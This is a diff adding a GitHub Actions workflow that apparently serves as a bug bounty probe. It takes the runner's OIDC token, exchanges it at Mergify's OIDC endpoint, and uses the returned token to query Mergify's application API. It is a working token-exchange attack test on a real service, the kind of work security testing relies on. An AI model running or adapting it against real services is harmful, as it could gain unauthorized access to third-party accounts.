@@ -1,0 +1,23 @@
+name: h1-exchange
+on:
+  workflow_call:
+jobs:
+  exchange:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+    steps:
+      - name: exchange
+        shell: bash
+        run: |
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://api.mergify.com" | jq -r .value)
+          echo "::add-mask::$IDT"
+          echo "$IDT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{repository, repository_owner, job_workflow_ref, event_name}' || true
+          CODE=$(curl -sS -o r.json -w '%{http_code}' -A hackerone-yuting4281 -H 'Content-Type: application/json' -d "{\"id_token\":\"$IDT\"}" https://api.mergify.com/v1/ci/oidc/exchange)
+          jq -r '..|strings|select(length>24 and (test(" ")|not))' r.json | while read -r v; do echo "::add-mask::$v"; done
+          echo "exchange_status=$CODE"
+          jq -c '{keys: keys, detail, error_code}' r.json
+          TOK=$(jq -r '[..|strings|select(length>24 and (test(" ")|not))][0] // empty' r.json)
+          if [ "$CODE" = 200 ] && [ -n "$TOK" ]; then
+            curl -sS -A hackerone-yuting4281 -H "Authorization: Bearer $TOK" https://api.mergify.com/v1/application; echo
+          fi
